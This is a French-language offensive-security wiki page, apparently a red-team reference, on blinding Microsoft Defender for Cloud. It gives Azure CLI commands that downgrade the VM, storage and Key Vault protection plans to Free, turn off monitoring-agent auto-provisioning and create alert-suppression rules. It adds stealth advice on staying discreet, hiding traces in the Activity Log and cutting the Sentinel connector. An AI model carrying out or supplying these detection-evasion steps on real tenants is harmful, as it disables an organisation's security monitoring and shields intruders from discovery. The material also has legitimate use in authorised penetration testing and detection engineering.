---
title: "Defender for Cloud : rétrograder les plans et la policy pour passer en mode sombre"
description: "Désactiver ou rétrograder les plans et la policy de Microsoft Defender for Cloud pour aveugler la détection de menaces cloud."
keywords:
  - Defender for Cloud
  - policy de sécurité
  - suppression d'alertes
  - évasion de détection
---

# Defender for Cloud

Microsoft Defender for Cloud est la couche de posture et de détection de menaces qui lève des alertes sur les comportements suspects des ressources (commandes de VM anormales, accès à Key Vault, exfiltration depuis le stockage). Un opérateur disposant de l'écriture `Microsoft.Security/*` fait passer ses plans payants en **Free**, désactive l'auto-provisioning des agents qui l'alimentent et supprime les alertes qu'il lèverait.

## Rétrograder les plans

```bash
# see which plans are on, then drop the ones watching your target to Free
az security pricing list -o table
az security pricing create -n VirtualMachines --tier Free
az security pricing create -n StorageAccounts --tier Free
az security pricing create -n KeyVaults --tier Free
```

## Couper la télémétrie et supprimer les alertes

```bash
# stop auto-provisioning the monitoring agent that feeds detections
az security auto-provisioning-setting update -n default --auto-provision Off

# create an alert suppression (dismiss) rule for the alert types you will trigger
az security alerts-suppression-rule update --rule-name quiet \
  --alert-type <AlertTypeName> --reason "Other" --state Enabled
```

## Notes d'exploitation

- L'état des plans est par abonnement ; dans un tenant multi-abonnements, ne rétrogradez que là où vous opérez pour rester discret, car un changement à l'échelle du tenant est lui-même visible.
- Les règles de suppression sont plus discrètes que la désactivation de tout le plan : le plan reste au vert tandis que l'alerte précise que vous attendez est auto-rejetée.
- Ces écritures `Microsoft.Security` atterrissent dans l'[Activity Log](activity-log.md) ; synchronisez-les avec ce qui s'exporte encore vers un SIEM.
- Les alertes Defender circulent souvent vers [Sentinel](sentinel.md) via un connecteur, donc désactiver le connecteur là-bas peut aveugler les mêmes alertes depuis l'autre bout.

## Outils

- **Azure CLI** (`az security pricing`, `az security auto-provisioning-setting`, `az security alerts-suppression-rule`).
- **MicroBurst** / **PowerZure** : énumération de la posture et changements en masse.

## Références

- [HackTricks Cloud : Azure Defender for Cloud](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [Stratus Red Team : techniques Azure](https://stratus-red-team.cloud/attack-techniques/azure/)
- [Microsoft : API de pricing de Defender for Cloud](https://learn.microsoft.com/rest/api/defenderforcloud/pricings)
